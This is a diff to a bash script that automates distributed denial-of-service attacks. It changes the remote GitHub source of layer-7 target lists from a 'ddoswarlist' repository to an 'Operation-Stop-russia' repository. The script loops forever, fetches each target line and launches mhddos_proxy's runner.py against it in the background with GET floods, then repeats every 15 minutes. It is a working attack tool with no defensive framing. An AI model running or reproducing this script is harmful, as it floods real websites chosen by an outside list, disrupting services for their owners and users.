@@ -9,15 +9,15 @@ method="--http-methods GET"
 while true
 do
    pkill -f runner.py 
-   list_size=$(curl -s https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer7.lst | cat | grep "^[^#]" | wc -l)
+   list_size=$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7 | cat | grep "^[^#]" | wc -l)
    while [[ $list_size = "0"  ]]
       do
             sleep 5
-            list_size=$(curl -s https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer7.lst | cat | grep "^[^#]" | wc -l)
+            list_size=$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7 | cat | grep "^[^#]" | wc -l)
       done
    for (( i=1; i<=list_size; i++ ))
       do
-            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer7.lst  | cat | grep "^[^#]")")
+            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7 | cat | grep "^[^#]")")
             python3 ~/mhddos_proxy/runner.py $cmd_line $method $threads $rpc $debug&
       done
 sleep 15m
